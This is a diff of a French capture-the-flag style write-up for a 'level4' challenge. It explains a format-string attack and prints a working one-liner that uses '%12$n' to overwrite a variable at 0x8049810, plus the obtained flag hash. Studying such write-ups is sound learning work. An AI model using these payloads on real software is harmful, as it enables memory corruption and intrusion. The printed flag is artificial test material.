@@ -7,7 +7,7 @@
     Le 12ème octet affiche `30414141` soit notre chaîne `AAA0` (inversée car little endian)
   
   - Avant l'appel système, une comparaison est faite avec la variable à l'adresse `0x8049810` qui contient *0x1025544* soit *16930116* en décimal
-  - Le fgets est limité à 512 caractères, on utilise donc l'option **padding** de printf pour écrire suffisamment de caractères pour obtenir la bonne valeur.
+  - Le fgets est limité à 512 caractères, on utilise donc l'option **padding** de printf pour écrire suffisamment de caractères pour obtenir la bonne valeur, et on exploite les caratèristiques du formateur **%x** puisqu'il affiche la valeur qu'il cible sur la pile.
   - `(python -c 'print("\x10\x98\x04\x08"+"%16930112x"+"%12$n")') | ./level4`
     > 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
 <br>
